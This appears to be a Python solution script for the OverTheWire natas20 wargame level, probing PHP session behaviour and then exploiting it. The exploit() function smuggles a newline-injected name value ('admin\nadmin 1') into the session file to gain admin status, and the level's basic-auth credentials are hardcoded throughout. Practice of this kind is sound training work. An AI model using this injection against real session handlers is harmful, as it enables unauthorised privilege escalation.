import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random


def receive_response(_payload):
    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
    response = requests.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def test_without_cookie_persistance():
    string_to_search = "Session file doesn't"


    print("-------------- Running test 1 ------------------")

    TESTS = 20

    for _ in range(TESTS):
        N = random.randint(5, 10)
        random_username = ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))
        _payload = {'name' : random_username}
        response = receive_response(_payload)
        try:
            response.text.index(string_to_search)
            print("Session file exists? False")
        except:
            print("Analyse more")
            print(response.text)

def test_with_cookie_persistance():

    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 

    initial_response = "Session file doesn't" # Session doesn't yet exist
    mid_response = "Name set to"

    print("-----------------------Test 2 --------------------------")
    TESTS = 20
    for _ in range(TESTS):
        N = random.randint(5, 10)
        random_username = ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))
        sess = requests.Session()
        _payload = {'name' : random_username}
        print("Subtest ------")

        try:
            response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
            response.text.index(initial_response)
            print("\t > Session does not exist initially")

            response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
            response.text.index(mid_response)
            print("\t > Session created")

            response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
            response.text.index(initial_response)

        except Exception as e:
            print("\t > Session file still exists")


def analyse_PHPSESSID_generation_procedure():
    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 

    for _ in range(100):
        N = random.randint(5, 10)
        random_username = ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))
        _payload = {'name' : random_username}

        response = requests.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
        
        for cookie in response.cookies:
            print(cookie.value)


def analyse_SESSID():
    
    # test_without_cookie_persistance()  <------ no cookie persistance here, thus Session file doesn't exist anymore

    # test_with_cookie_persistance()       <------ cookie persistance

    # analyse_PHPSESSID_generation_procedure() # <----------- no perceived pattern even for same username (this is also depicted by the source code online)

    sess = requests.Session()

    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 
    response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) # g2acrrmhkt6fcoprq6ggr5ot36 Session file doesn't exist

    _payload = {'name' : 'admin'}
    response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    dissect_response(response) # g2acrrmhkt6fcoprq6ggr5ot36 set name to admin

    response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) # g2acrrmhkt6fcoprq6ggr5ot36 reads admin and re-saves

    _payload = {'name' : 'm'}
    response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    dissect_response(response) # g2acrrmhkt6fcoprq6ggr5ot36 set name to m

def exploit():

    sess = requests.Session()

    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 
    _payload = {'name' : 'admin\nadmin 1'}
    response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    dissect_response(response) 

    response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) 



exploit()